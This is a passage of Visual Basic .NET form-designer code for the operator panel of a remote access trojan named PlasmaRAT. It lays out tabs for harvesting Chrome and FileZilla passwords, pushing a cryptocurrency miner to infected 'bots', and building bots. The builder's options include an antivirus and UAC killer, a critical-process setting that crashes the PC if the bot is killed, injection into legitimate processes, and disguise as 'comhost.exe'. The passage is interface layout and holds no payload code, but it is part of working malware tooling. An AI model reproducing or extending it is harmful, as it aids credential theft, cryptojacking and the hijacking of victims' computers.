        Me.ToolStripMenuItem6.Image = CType(resources.GetObject("ToolStripMenuItem6.Image"), System.Drawing.Image)
        Me.ToolStripMenuItem6.Name = "ToolStripMenuItem6"
        Me.ToolStripMenuItem6.Size = New System.Drawing.Size(147, 22)
        Me.ToolStripMenuItem6.Text = "Clear All Logs"
        '
        'TabPage3
        '
        Me.TabPage3.Controls.Add(Me.CommandsListView)
        Me.TabPage3.ImageIndex = 23
        Me.TabPage3.Location = New System.Drawing.Point(4, 23)
        Me.TabPage3.Name = "TabPage3"
        Me.TabPage3.Size = New System.Drawing.Size(637, 300)
        Me.TabPage3.TabIndex = 2
        Me.TabPage3.Text = "Command Logs"
        Me.TabPage3.UseVisualStyleBackColor = True
        '
        'Commands
        '
        Me.Commands.Items.AddRange(New System.Windows.Forms.ToolStripItem() {Me.ResendCommandToolStripMenuItem, Me.SendCommandOnConnectToolStripMenuItem, Me.ToolStripSeparator5, Me.ToolStripMenuItem11, Me.ToolStripMenuItem12, Me.ToolStripSeparator6, Me.ToolStripMenuItem13, Me.ToolStripMenuItem14})
        Me.Commands.Name = "ContextMenuStrip1"
        Me.Commands.Size = New System.Drawing.Size(212, 148)
        '
        'ResendCommandToolStripMenuItem
        '
        Me.ResendCommandToolStripMenuItem.Image = CType(resources.GetObject("ResendCommandToolStripMenuItem.Image"), System.Drawing.Image)
        Me.ResendCommandToolStripMenuItem.Name = "ResendCommandToolStripMenuItem"
        Me.ResendCommandToolStripMenuItem.Size = New System.Drawing.Size(211, 22)
        Me.ResendCommandToolStripMenuItem.Text = "Resend Command"
        '
        'SendCommandOnConnectToolStripMenuItem
        '
        Me.SendCommandOnConnectToolStripMenuItem.Image = CType(resources.GetObject("SendCommandOnConnectToolStripMenuItem.Image"), System.Drawing.Image)
        Me.SendCommandOnConnectToolStripMenuItem.Name = "SendCommandOnConnectToolStripMenuItem"
        Me.SendCommandOnConnectToolStripMenuItem.Size = New System.Drawing.Size(211, 22)
        Me.SendCommandOnConnectToolStripMenuItem.Text = "Set As On-Join Command"
        '
        'ToolStripSeparator5
        '
        Me.ToolStripSeparator5.Name = "ToolStripSeparator5"
        Me.ToolStripSeparator5.Size = New System.Drawing.Size(208, 6)
        '
        'ToolStripMenuItem11
        '
        Me.ToolStripMenuItem11.Image = CType(resources.GetObject("ToolStripMenuItem11.Image"), System.Drawing.Image)
        Me.ToolStripMenuItem11.Name = "ToolStripMenuItem11"
        Me.ToolStripMenuItem11.Size = New System.Drawing.Size(211, 22)
        Me.ToolStripMenuItem11.Text = "On-Join Command: N/A"
        '
        'ToolStripMenuItem12
        '
        Me.ToolStripMenuItem12.Image = CType(resources.GetObject("ToolStripMenuItem12.Image"), System.Drawing.Image)
        Me.ToolStripMenuItem12.Name = "ToolStripMenuItem12"
        Me.ToolStripMenuItem12.Size = New System.Drawing.Size(211, 22)
        Me.ToolStripMenuItem12.Text = "Reset On-Join Command"
        '
        'ToolStripSeparator6
        '
        Me.ToolStripSeparator6.Name = "ToolStripSeparator6"
        Me.ToolStripSeparator6.Size = New System.Drawing.Size(208, 6)
        '
        'ToolStripMenuItem13
        '
        Me.ToolStripMenuItem13.Image = CType(resources.GetObject("ToolStripMenuItem13.Image"), System.Drawing.Image)
        Me.ToolStripMenuItem13.Name = "ToolStripMenuItem13"
        Me.ToolStripMenuItem13.Size = New System.Drawing.Size(211, 22)
        Me.ToolStripMenuItem13.Text = "Copy All Logs"
        '
        'ToolStripMenuItem14
        '
        Me.ToolStripMenuItem14.Image = CType(resources.GetObject("ToolStripMenuItem14.Image"), System.Drawing.Image)
        Me.ToolStripMenuItem14.Name = "ToolStripMenuItem14"
        Me.ToolStripMenuItem14.Size = New System.Drawing.Size(211, 22)
        Me.ToolStripMenuItem14.Text = "Clear All Logs"
        '
        'TabPage5
        '
        Me.TabPage5.Controls.Add(Me.PasswordListView)
        Me.TabPage5.ImageIndex = 89
        Me.TabPage5.Location = New System.Drawing.Point(4, 23)
        Me.TabPage5.Name = "TabPage5"
        Me.TabPage5.Size = New System.Drawing.Size(637, 300)
        Me.TabPage5.TabIndex = 6
        Me.TabPage5.Text = "Passwords"
        Me.TabPage5.UseVisualStyleBackColor = True
        '
        'PasswordRightClick
        '
        Me.PasswordRightClick.Items.AddRange(New System.Windows.Forms.ToolStripItem() {Me.ToolStripMenuItem4, Me.ToolStripMenuItem7, Me.ToolStripSeparator2, Me.ToolStripMenuItem8, Me.ToolStripMenuItem10, Me.ToolStripSeparator4, Me.ToolStripMenuItem9})
        Me.PasswordRightClick.Name = "ContextMenuStrip1"
        Me.PasswordRightClick.Size = New System.Drawing.Size(229, 126)
        '
        'ToolStripMenuItem4
        '
        Me.ToolStripMenuItem4.Image = CType(resources.GetObject("ToolStripMenuItem4.Image"), System.Drawing.Image)
        Me.ToolStripMenuItem4.Name = "ToolStripMenuItem4"
        Me.ToolStripMenuItem4.Size = New System.Drawing.Size(228, 22)
        Me.ToolStripMenuItem4.Text = "Recover Chrome Passwords"
        '
        'ToolStripMenuItem7
        '
        Me.ToolStripMenuItem7.Image = CType(resources.GetObject("ToolStripMenuItem7.Image"), System.Drawing.Image)
        Me.ToolStripMenuItem7.Name = "ToolStripMenuItem7"
        Me.ToolStripMenuItem7.Size = New System.Drawing.Size(228, 22)
        Me.ToolStripMenuItem7.Text = "Recover FileZila Passwords"
        '
        'ToolStripSeparator2
        '
        Me.ToolStripSeparator2.Name = "ToolStripSeparator2"
        Me.ToolStripSeparator2.Size = New System.Drawing.Size(225, 6)
        '
        'ToolStripMenuItem8
        '
        Me.ToolStripMenuItem8.Image = CType(resources.GetObject("ToolStripMenuItem8.Image"), System.Drawing.Image)
        Me.ToolStripMenuItem8.Name = "ToolStripMenuItem8"
        Me.ToolStripMenuItem8.Size = New System.Drawing.Size(228, 22)
        Me.ToolStripMenuItem8.Text = "Export Passwords (.txt)"
        '
        'ToolStripMenuItem10
        '
        Me.ToolStripMenuItem10.Image = CType(resources.GetObject("ToolStripMenuItem10.Image"), System.Drawing.Image)
        Me.ToolStripMenuItem10.Name = "ToolStripMenuItem10"
        Me.ToolStripMenuItem10.Size = New System.Drawing.Size(228, 22)
        Me.ToolStripMenuItem10.Text = "Export Passwords (Clipboard)"
        '
        'ToolStripSeparator4
        '
        Me.ToolStripSeparator4.Name = "ToolStripSeparator4"
        Me.ToolStripSeparator4.Size = New System.Drawing.Size(225, 6)
        '
        'ToolStripMenuItem9
        '
        Me.ToolStripMenuItem9.Image = CType(resources.GetObject("ToolStripMenuItem9.Image"), System.Drawing.Image)
        Me.ToolStripMenuItem9.Name = "ToolStripMenuItem9"
        Me.ToolStripMenuItem9.Size = New System.Drawing.Size(228, 22)
        Me.ToolStripMenuItem9.Text = "Clear All Password Logs"
        '
        'TabPage8
        '
        Me.TabPage8.Controls.Add(Me.GroupBox9)
        Me.TabPage8.ImageIndex = 70
        Me.TabPage8.Location = New System.Drawing.Point(4, 23)
        Me.TabPage8.Name = "TabPage8"
        Me.TabPage8.Size = New System.Drawing.Size(637, 300)
        Me.TabPage8.TabIndex = 8
        Me.TabPage8.Text = "Miner"
        Me.TabPage8.UseVisualStyleBackColor = True
        '
        'GroupBox9
        '
        Me.GroupBox9.Controls.Add(Me.Button4)
        Me.GroupBox9.Controls.Add(Me.GroupBox10)
        Me.GroupBox9.Controls.Add(Me.TextBox7)
        Me.GroupBox9.Controls.Add(Me.SendMinerOnConnect)
        Me.GroupBox9.Controls.Add(Me.Button14)
        Me.GroupBox9.Controls.Add(Me.Button15)
        Me.GroupBox9.Location = New System.Drawing.Point(3, 3)
        Me.GroupBox9.Name = "GroupBox9"
        Me.GroupBox9.Size = New System.Drawing.Size(626, 294)
        Me.GroupBox9.TabIndex = 0
        Me.GroupBox9.TabStop = False
        Me.GroupBox9.Text = "Cryptocurrency Miner"
        '
        'Button4
        '
        Me.Button4.Image = CType(resources.GetObject("Button4.Image"), System.Drawing.Image)
        Me.Button4.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft
        Me.Button4.Location = New System.Drawing.Point(474, 265)
        Me.Button4.Name = "Button4"
        Me.Button4.Size = New System.Drawing.Size(147, 23)
        Me.Button4.TabIndex = 24
        Me.Button4.Text = "Reset Miner"
        Me.ToolTip1.SetToolTip(Me.Button4, "Resets the miner on your bots. This deletes the miner files for both CPU and GPU." & _
                "" & Global.Microsoft.VisualBasic.ChrW(13) & Global.Microsoft.VisualBasic.ChrW(10) & Global.Microsoft.VisualBasic.ChrW(13) & Global.Microsoft.VisualBasic.ChrW(10) & "This is to be used if you download the wrong miner files to your bots.")
        Me.Button4.UseVisualStyleBackColor = True
        '
        'GroupBox10
        '
        Me.GroupBox10.Controls.Add(Me.GPUMiner)
        Me.GroupBox10.Controls.Add(Me.CPUMiner)
        Me.GroupBox10.Controls.Add(Me.MinerFiles)
        Me.GroupBox10.Controls.Add(Me.Label17)
        Me.GroupBox10.Controls.Add(Me.Label14)
        Me.GroupBox10.Controls.Add(Me.MinerPool)
        Me.GroupBox10.Controls.Add(Me.MinerPass)
        Me.GroupBox10.Controls.Add(Me.Label15)
        Me.GroupBox10.Controls.Add(Me.MinerUser)
        Me.GroupBox10.Controls.Add(Me.Label16)
        Me.GroupBox10.Location = New System.Drawing.Point(9, 19)
        Me.GroupBox10.Name = "GroupBox10"
        Me.GroupBox10.Size = New System.Drawing.Size(305, 210)
        Me.GroupBox10.TabIndex = 23
        Me.GroupBox10.TabStop = False
        Me.GroupBox10.Text = "Miner Settings"
        '
        'GPUMiner
        '
        Me.GPUMiner.AutoSize = True
        Me.GPUMiner.Location = New System.Drawing.Point(222, 19)
        Me.GPUMiner.Name = "GPUMiner"
        Me.GPUMiner.Size = New System.Drawing.Size(77, 17)
        Me.GPUMiner.TabIndex = 25
        Me.GPUMiner.Text = "GPU Miner"
        Me.ToolTip1.SetToolTip(Me.GPUMiner, "Mines on bots GPUs using Ufasoft. Intensity is automatically adjusted for best re" & _
                "sults." & Global.Microsoft.VisualBasic.ChrW(13) & Global.Microsoft.VisualBasic.ChrW(10) & Global.Microsoft.VisualBasic.ChrW(13) & Global.Microsoft.VisualBasic.ChrW(10) & "Please note that, due to the nature of GPU mining, this will lag your " & _
                "bots more than the CPU Miner.")
        Me.GPUMiner.UseVisualStyleBackColor = True
        '
        'CPUMiner
        '
        Me.CPUMiner.AutoSize = True
        Me.CPUMiner.Checked = True
        Me.CPUMiner.Location = New System.Drawing.Point(10, 19)
        Me.CPUMiner.Name = "CPUMiner"
        Me.CPUMiner.Size = New System.Drawing.Size(76, 17)
        Me.CPUMiner.TabIndex = 24
        Me.CPUMiner.TabStop = True
        Me.CPUMiner.Text = "CPU Miner"
        Me.ToolTip1.SetToolTip(Me.CPUMiner, "Mines on all CPUs. Automatically adjusts CPU Usage.")
        Me.CPUMiner.UseVisualStyleBackColor = True
        '
        'MinerFiles
        '
        Me.MinerFiles.Location = New System.Drawing.Point(10, 62)
        Me.MinerFiles.Name = "MinerFiles"
        Me.MinerFiles.Size = New System.Drawing.Size(286, 20)
        Me.MinerFiles.TabIndex = 23
        Me.MinerFiles.Text = "http://google.com/file.exe"
        Me.MinerFiles.TextAlign = System.Windows.Forms.HorizontalAlignment.Center
        Me.ToolTip1.SetToolTip(Me.MinerFiles, "Use default link. See the support forums for mirrors if default is down.")
        '
        'Label17
        '
        Me.Label17.AutoSize = True
        Me.Label17.Location = New System.Drawing.Point(118, 46)
        Me.Label17.Name = "Label17"
        Me.Label17.Size = New System.Drawing.Size(77, 13)
        Me.Label17.TabIndex = 22
        Me.Label17.Text = "File Download:"
        '
        'Label14
        '
        Me.Label14.AutoSize = True
        Me.Label14.Location = New System.Drawing.Point(118, 85)
        Me.Label14.Name = "Label14"
        Me.Label14.Size = New System.Drawing.Size(63, 13)
        Me.Label14.TabIndex = 16
        Me.Label14.Text = "Miner Pool: "
        '
        'MinerPool
        '
        Me.MinerPool.Location = New System.Drawing.Point(10, 101)
        Me.MinerPool.Name = "MinerPool"
        Me.MinerPool.Size = New System.Drawing.Size(286, 20)
        Me.MinerPool.TabIndex = 17
        Me.MinerPool.Text = "stratum+tcp://ltc-stratum.examplepool.net"
        Me.MinerPool.TextAlign = System.Windows.Forms.HorizontalAlignment.Center
        Me.ToolTip1.SetToolTip(Me.MinerPool, "Stratum mining pool." & Global.Microsoft.VisualBasic.ChrW(13) & Global.Microsoft.VisualBasic.ChrW(10) & Global.Microsoft.VisualBasic.ChrW(13) & Global.Microsoft.VisualBasic.ChrW(10) & "Miner supports all standard scrypt crypto currencies.")
        '
        'MinerPass
        '
        Me.MinerPass.Location = New System.Drawing.Point(10, 179)
        Me.MinerPass.Name = "MinerPass"
        Me.MinerPass.Size = New System.Drawing.Size(285, 20)
        Me.MinerPass.TabIndex = 21
        Me.MinerPass.TextAlign = System.Windows.Forms.HorizontalAlignment.Center
        Me.ToolTip1.SetToolTip(Me.MinerPass, "Worker password, example: ""x""")
        '
        'Label15
        '
        Me.Label15.AutoSize = True
        Me.Label15.Location = New System.Drawing.Point(118, 124)
        Me.Label15.Name = "Label15"
        Me.Label15.Size = New System.Drawing.Size(82, 13)
        Me.Label15.TabIndex = 18
        Me.Label15.Text = "Pool Username:"
        '
        'MinerUser
        '
        Me.MinerUser.Location = New System.Drawing.Point(10, 140)
        Me.MinerUser.Name = "MinerUser"
        Me.MinerUser.Size = New System.Drawing.Size(285, 20)
        Me.MinerUser.TabIndex = 20
        Me.MinerUser.Text = "Example.User"
        Me.MinerUser.TextAlign = System.Windows.Forms.HorizontalAlignment.Center
        Me.ToolTip1.SetToolTip(Me.MinerUser, "Worker username, example:" & Global.Microsoft.VisualBasic.ChrW(13) & Global.Microsoft.VisualBasic.ChrW(10) & "John.1")
        '
        'Label16
        '
        Me.Label16.AutoSize = True
        Me.Label16.Location = New System.Drawing.Point(118, 163)
        Me.Label16.Name = "Label16"
        Me.Label16.Size = New System.Drawing.Size(80, 13)
        Me.Label16.TabIndex = 19
        Me.Label16.Text = "Pool Password:"
        '
        'TextBox7
        '
        Me.TextBox7.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle
        Me.TextBox7.Font = New System.Drawing.Font("Verdana", 8.25!)
        Me.TextBox7.Location = New System.Drawing.Point(320, 19)
        Me.TextBox7.Multiline = True
        Me.TextBox7.Name = "TextBox7"
        Me.TextBox7.Size = New System.Drawing.Size(295, 240)
        Me.TextBox7.TabIndex = 22
        Me.TextBox7.Text = resources.GetString("TextBox7.Text")
        '
        'SendMinerOnConnect
        '
        Me.SendMinerOnConnect.AutoSize = True
        Me.SendMinerOnConnect.Location = New System.Drawing.Point(63, 242)
        Me.SendMinerOnConnect.Name = "SendMinerOnConnect"
        Me.SendMinerOnConnect.Size = New System.Drawing.Size(196, 17)
        Me.SendMinerOnConnect.TabIndex = 15
        Me.SendMinerOnConnect.Text = "Send Miner to Bots as they Connect"
        Me.ToolTip1.SetToolTip(Me.SendMinerOnConnect, "Sends the start mining command to bots as they connect. ")
        Me.SendMinerOnConnect.UseVisualStyleBackColor = True
        '
        'Button14
        '
        Me.Button14.Image = CType(resources.GetObject("Button14.Image"), System.Drawing.Image)
        Me.Button14.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft
        Me.Button14.Location = New System.Drawing.Point(6, 265)
        Me.Button14.Name = "Button14"
        Me.Button14.Size = New System.Drawing.Size(308, 23)
        Me.Button14.TabIndex = 14
        Me.Button14.Text = "Start Mining on Bots"
        Me.ToolTip1.SetToolTip(Me.Button14, "Sends the miner command to all online bots. " & Global.Microsoft.VisualBasic.ChrW(13) & Global.Microsoft.VisualBasic.ChrW(10) & Global.Microsoft.VisualBasic.ChrW(13) & Global.Microsoft.VisualBasic.ChrW(10) & "Bots will mine until you hit ""sto" & _
                "p mining"", even if PlasmaRAT is closed.")
        Me.Button14.UseVisualStyleBackColor = True
        '
        'Button15
        '
        Me.Button15.Image = CType(resources.GetObject("Button15.Image"), System.Drawing.Image)
        Me.Button15.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft
        Me.Button15.Location = New System.Drawing.Point(320, 265)
        Me.Button15.Name = "Button15"
        Me.Button15.Size = New System.Drawing.Size(147, 23)
        Me.Button15.TabIndex = 13
        Me.Button15.Text = "Stop Mining on Bots"
        Me.ToolTip1.SetToolTip(Me.Button15, "Stops mining on all of your bots. ")
        Me.Button15.UseVisualStyleBackColor = True
        '
        'TabPage7
        '
        Me.TabPage7.Controls.Add(Me.GroupBox13)
        Me.TabPage7.Controls.Add(Me.GroupBox7)
        Me.TabPage7.Controls.Add(Me.Button16)
        Me.TabPage7.Controls.Add(Me.GroupBox11)
        Me.TabPage7.Controls.Add(Me.GroupBox6)
        Me.TabPage7.Controls.Add(Me.Button13)
        Me.TabPage7.ImageIndex = 17
        Me.TabPage7.Location = New System.Drawing.Point(4, 23)
        Me.TabPage7.Name = "TabPage7"
        Me.TabPage7.Size = New System.Drawing.Size(637, 300)
        Me.TabPage7.TabIndex = 7
        Me.TabPage7.Text = "Builder"
        Me.TabPage7.UseVisualStyleBackColor = True
        '
        'GroupBox13
        '
        Me.GroupBox13.Controls.Add(Me.EnableBackupDNS)
        Me.GroupBox13.Controls.Add(Me.TestBackupDNS)
        Me.GroupBox13.Controls.Add(Me.BackupDNS)
        Me.GroupBox13.Location = New System.Drawing.Point(9, 83)
        Me.GroupBox13.Name = "GroupBox13"
        Me.GroupBox13.Size = New System.Drawing.Size(340, 44)
        Me.GroupBox13.TabIndex = 19
        Me.GroupBox13.TabStop = False
        Me.GroupBox13.Text = "Backup DNS"
        '
        'EnableBackupDNS
        '
        Me.EnableBackupDNS.AutoSize = True
        Me.EnableBackupDNS.Location = New System.Drawing.Point(9, 17)
        Me.EnableBackupDNS.Name = "EnableBackupDNS"
        Me.EnableBackupDNS.Size = New System.Drawing.Size(59, 17)
        Me.EnableBackupDNS.TabIndex = 12
        Me.EnableBackupDNS.Text = "Enable"
        Me.ToolTip1.SetToolTip(Me.EnableBackupDNS, resources.GetString("EnableBackupDNS.ToolTip"))
        Me.EnableBackupDNS.UseVisualStyleBackColor = True
        '
        'TestBackupDNS
        '
        Me.TestBackupDNS.Enabled = False
        Me.TestBackupDNS.Image = CType(resources.GetObject("TestBackupDNS.Image"), System.Drawing.Image)
        Me.TestBackupDNS.ImageAlign = System.Drawing.ContentAlignment.MiddleRight
        Me.TestBackupDNS.Location = New System.Drawing.Point(250, 12)
        Me.TestBackupDNS.Name = "TestBackupDNS"
        Me.TestBackupDNS.Size = New System.Drawing.Size(85, 23)
        Me.TestBackupDNS.TabIndex = 11
        Me.TestBackupDNS.Text = "Test"
        Me.TestBackupDNS.UseVisualStyleBackColor = True
        '
        'BackupDNS
        '
        Me.BackupDNS.Enabled = False
        Me.BackupDNS.Location = New System.Drawing.Point(84, 14)
        Me.BackupDNS.Name = "BackupDNS"
        Me.BackupDNS.Size = New System.Drawing.Size(160, 20)
        Me.BackupDNS.TabIndex = 6
        Me.BackupDNS.Text = "example.no-ip.org"
        Me.BackupDNS.TextAlign = System.Windows.Forms.HorizontalAlignment.Center
        Me.ToolTip1.SetToolTip(Me.BackupDNS, "The DNS/Server the port connects to." & Global.Microsoft.VisualBasic.ChrW(13) & Global.Microsoft.VisualBasic.ChrW(10) & Global.Microsoft.VisualBasic.ChrW(13) & Global.Microsoft.VisualBasic.ChrW(10) & "Forward it to your IP.")
        '
        'GroupBox7
        '
        Me.GroupBox7.Controls.Add(Me.GlobalMessage)
        Me.GroupBox7.Location = New System.Drawing.Point(9, 130)
        Me.GroupBox7.Name = "GroupBox7"
        Me.GroupBox7.Size = New System.Drawing.Size(340, 138)
        Me.GroupBox7.TabIndex = 18
        Me.GroupBox7.TabStop = False
        Me.GroupBox7.Text = "Bot Builder Info"
        '
        'GlobalMessage
        '
        Me.GlobalMessage.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle
        Me.GlobalMessage.Font = New System.Drawing.Font("Verdana", 8.25!)
        Me.GlobalMessage.Location = New System.Drawing.Point(6, 19)
        Me.GlobalMessage.Multiline = True
        Me.GlobalMessage.Name = "GlobalMessage"
        Me.GlobalMessage.Size = New System.Drawing.Size(325, 113)
        Me.GlobalMessage.TabIndex = 23
        Me.GlobalMessage.Text = "Latest Version: 1.5"
        '
        'Button16
        '
        Me.Button16.Image = CType(resources.GetObject("Button16.Image"), System.Drawing.Image)
        Me.Button16.ImageAlign = System.Drawing.ContentAlignment.MiddleRight
        Me.Button16.Location = New System.Drawing.Point(355, 274)
        Me.Button16.Name = "Button16"
        Me.Button16.Size = New System.Drawing.Size(276, 23)
        Me.Button16.TabIndex = 10
        Me.Button16.Text = "Troubleshooting"
        Me.Button16.UseVisualStyleBackColor = True
        '
        'GroupBox11
        '
        Me.GroupBox11.Controls.Add(Me.Label20)
        Me.GroupBox11.Controls.Add(Me.Folder)
        Me.GroupBox11.Controls.Add(Me.EnableInstallation)
        Me.GroupBox11.Controls.Add(Me.SetProcessCritical)
        Me.GroupBox11.Controls.Add(Me.Label18)
        Me.GroupBox11.Controls.Add(Me.SetKernelObjectSecurity)
        Me.GroupBox11.Controls.Add(Me.FileName)
        Me.GroupBox11.Controls.Add(Me.SWIP)
        Me.GroupBox11.Controls.Add(Me.Label19)
        Me.GroupBox11.Controls.Add(Me.AutomaticBK)
        Me.GroupBox11.Controls.Add(Me.AVKiller)
        Me.GroupBox11.Controls.Add(Me.BotResourceProtection)
        Me.GroupBox11.Location = New System.Drawing.Point(355, 4)
        Me.GroupBox11.Name = "GroupBox11"
        Me.GroupBox11.Size = New System.Drawing.Size(276, 264)
        Me.GroupBox11.TabIndex = 11
        Me.GroupBox11.TabStop = False
        Me.GroupBox11.Text = "Bot Installation and Persistence"
        '
        'Label20
        '
        Me.Label20.AutoSize = True
        Me.Label20.Location = New System.Drawing.Point(59, 110)
        Me.Label20.Name = "Label20"
        Me.Label20.Size = New System.Drawing.Size(123, 13)
        Me.Label20.TabIndex = 18
        Me.Label20.Text = "Bot Persistence Options:"
        '
        'Folder
        '
        Me.Folder.Location = New System.Drawing.Point(72, 69)
        Me.Folder.Name = "Folder"
        Me.Folder.Size = New System.Drawing.Size(160, 20)
        Me.Folder.TabIndex = 10
        Me.Folder.Text = "{$1284-9213-2940-1289$}"
        Me.Folder.TextAlign = System.Windows.Forms.HorizontalAlignment.Center
        Me.ToolTip1.SetToolTip(Me.Folder, "The Folder the bot installs into.")
        '
        'EnableInstallation
        '
        Me.EnableInstallation.AutoSize = True
        Me.EnableInstallation.Checked = True
        Me.EnableInstallation.CheckState = System.Windows.Forms.CheckState.Checked
        Me.EnableInstallation.Location = New System.Drawing.Point(20, 23)
        Me.EnableInstallation.Name = "EnableInstallation"
        Me.EnableInstallation.Size = New System.Drawing.Size(229, 17)
        Me.EnableInstallation.TabIndex = 17
        Me.EnableInstallation.Text = "Enable Installation and Persistence Module"
        Me.ToolTip1.SetToolTip(Me.EnableInstallation, resources.GetString("EnableInstallation.ToolTip"))
        Me.EnableInstallation.UseVisualStyleBackColor = True
        '
        'SetProcessCritical
        '
        Me.SetProcessCritical.AutoSize = True
        Me.SetProcessCritical.Location = New System.Drawing.Point(5, 241)
        Me.SetProcessCritical.Name = "SetProcessCritical"
        Me.SetProcessCritical.Size = New System.Drawing.Size(243, 17)
        Me.SetProcessCritical.TabIndex = 5
        Me.SetProcessCritical.Text = "Set Process Critical (NtSetInformationProcess)"
        Me.ToolTip1.SetToolTip(Me.SetProcessCritical, "Sets the process as a critical system process. If killed, PC will BSOD. " & Global.Microsoft.VisualBasic.ChrW(13) & Global.Microsoft.VisualBasic.ChrW(10) & Global.Microsoft.VisualBasic.ChrW(13) & Global.Microsoft.VisualBasic.ChrW(10) & "Will " & _
                "unset itself on PC shutdown/reboot.")
        Me.SetProcessCritical.UseVisualStyleBackColor = True
        '
        'Label18
        '
        Me.Label18.AutoSize = True
        Me.Label18.Location = New System.Drawing.Point(6, 47)
        Me.Label18.Name = "Label18"
        Me.Label18.Size = New System.Drawing.Size(57, 13)
        Me.Label18.TabIndex = 7
        Me.Label18.Text = "File Name:"
        '
        'SetKernelObjectSecurity
        '
        Me.SetKernelObjectSecurity.AutoSize = True
        Me.SetKernelObjectSecurity.Checked = True
        Me.SetKernelObjectSecurity.CheckState = System.Windows.Forms.CheckState.Checked
        Me.SetKernelObjectSecurity.Location = New System.Drawing.Point(6, 126)
        Me.SetKernelObjectSecurity.Name = "SetKernelObjectSecurity"
        Me.SetKernelObjectSecurity.Size = New System.Drawing.Size(233, 17)
        Me.SetKernelObjectSecurity.TabIndex = 0
        Me.SetKernelObjectSecurity.Text = "SetKernelObjectSecurity Process Protection"
        Me.ToolTip1.SetToolTip(Me.SetKernelObjectSecurity, "Prevents users from accessing/terminating the bot process")
        Me.SetKernelObjectSecurity.UseVisualStyleBackColor = True
        '
        'FileName
        '
        Me.FileName.Location = New System.Drawing.Point(72, 44)
        Me.FileName.Name = "FileName"
        Me.FileName.Size = New System.Drawing.Size(160, 20)
        Me.FileName.TabIndex = 8
        Me.FileName.Text = "comhost.exe"
        Me.FileName.TextAlign = System.Windows.Forms.HorizontalAlignment.Center
        Me.ToolTip1.SetToolTip(Me.FileName, "The File Name the bot is installed as.")
        '
        'SWIP
        '
        Me.SWIP.AutoSize = True
        Me.SWIP.Checked = True
        Me.SWIP.CheckState = System.Windows.Forms.CheckState.Checked
        Me.SWIP.Location = New System.Drawing.Point(6, 149)
        Me.SWIP.Name = "SWIP"
        Me.SWIP.Size = New System.Drawing.Size(226, 17)
        Me.SWIP.TabIndex = 1
        Me.SWIP.Text = "System Wide Injection Persistence (SWIP)"
        Me.ToolTip1.SetToolTip(Me.SWIP, "Injects into other (legit) processes to monitor the bot. Restarts the bot if kill" & _
                "ed.")
        Me.SWIP.UseVisualStyleBackColor = True
        '
        'Label19
        '
        Me.Label19.AutoSize = True
        Me.Label19.Location = New System.Drawing.Point(6, 72)
        Me.Label19.Name = "Label19"
        Me.Label19.Size = New System.Drawing.Size(39, 13)
        Me.Label19.TabIndex = 9
        Me.Label19.Text = "Folder:"
        '
        'AutomaticBK
        '
        Me.AutomaticBK.AutoSize = True
        Me.AutomaticBK.Location = New System.Drawing.Point(5, 218)
        Me.AutomaticBK.Name = "AutomaticBK"
        Me.AutomaticBK.Size = New System.Drawing.Size(203, 17)
        Me.AutomaticBK.TabIndex = 4
        Me.AutomaticBK.Text = "Run Proactive Bot Killer Automatically"
        Me.ToolTip1.SetToolTip(Me.AutomaticBK, "Enables the Proactive Bot Killer automatically. Please note that while using this" & _
                " feature, you cannot disable the Proactive Bot Killer.")
        Me.AutomaticBK.UseVisualStyleBackColor = True
        '
        'AVKiller
        '
        Me.AVKiller.AutoSize = True
        Me.AVKiller.Checked = True
        Me.AVKiller.CheckState = System.Windows.Forms.CheckState.Checked
        Me.AVKiller.Location = New System.Drawing.Point(6, 172)
        Me.AVKiller.Name = "AVKiller"
        Me.AVKiller.Size = New System.Drawing.Size(212, 17)
        Me.AVKiller.TabIndex = 2
        Me.AVKiller.Text = "Antivirus Killer (Standard and Proactive)"
        Me.ToolTip1.SetToolTip(Me.AVKiller, "Prevents the use and installation of security solutions that may be harmful to th" & _
                "e bot." & Global.Microsoft.VisualBasic.ChrW(13) & Global.Microsoft.VisualBasic.ChrW(10) & Global.Microsoft.VisualBasic.ChrW(13) & Global.Microsoft.VisualBasic.ChrW(10) & "This includes the UAC prompt to gain admin permissions for the AV Kill" & _
                "er.")
        Me.AVKiller.UseVisualStyleBackColor = True
        '
        'BotResourceProtection
        '
        Me.BotResourceProtection.AutoSize = True
        Me.BotResourceProtection.Checked = True
        Me.BotResourceProtection.CheckState = System.Windows.Forms.CheckState.Checked
        Me.BotResourceProtection.Location = New System.Drawing.Point(5, 195)
        Me.BotResourceProtection.Name = "BotResourceProtection"
        Me.BotResourceProtection.Size = New System.Drawing.Size(177, 17)
        Me.BotResourceProtection.TabIndex = 3
        Me.BotResourceProtection.Text = "Bot Startup and File Persistence"
        Me.ToolTip1.SetToolTip(Me.BotResourceProtection, "Ensures the bot is always in startup, and protects the bot and its files from mod" & _
                "ification.")
        Me.BotResourceProtection.UseVisualStyleBackColor = True
        '
        'GroupBox6
        '
        Me.GroupBox6.Controls.Add(Me.Button8)
        Me.GroupBox6.Controls.Add(Me.Button6)
        Me.GroupBox6.Controls.Add(Me.Label13)
        Me.GroupBox6.Controls.Add(Me.DNSBuild)
        Me.GroupBox6.Controls.Add(Me.PORTBuild)
        Me.GroupBox6.Controls.Add(Me.Label12)
        Me.GroupBox6.Location = New System.Drawing.Point(9, 3)
        Me.GroupBox6.Name = "GroupBox6"
        Me.GroupBox6.Size = New System.Drawing.Size(340, 74)
        Me.GroupBox6.TabIndex = 10
        Me.GroupBox6.TabStop = False
        Me.GroupBox6.Text = "Connection"
        '
        'Button8
        '
        Me.Button8.Image = CType(resources.GetObject("Button8.Image"), System.Drawing.Image)
        Me.Button8.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft
        Me.Button8.Location = New System.Drawing.Point(250, 38)
        Me.Button8.Name = "Button8"
        Me.Button8.Size = New System.Drawing.Size(84, 23)
        Me.Button8.TabIndex = 12
        Me.Button8.Text = "Check"
        Me.Button8.UseVisualStyleBackColor = True
        '
        'Button6
        '
        Me.Button6.Image = CType(resources.GetObject("Button6.Image"), System.Drawing.Image)
        Me.Button6.ImageAlign = System.Drawing.ContentAlignment.MiddleRight
        Me.Button6.Location = New System.Drawing.Point(249, 11)
        Me.Button6.Name = "Button6"
        Me.Button6.Size = New System.Drawing.Size(85, 23)
        Me.Button6.TabIndex = 11
        Me.Button6.Text = "Test"
        Me.Button6.UseVisualStyleBackColor = True
        '
        'Label13
        '
        Me.Label13.AutoSize = True
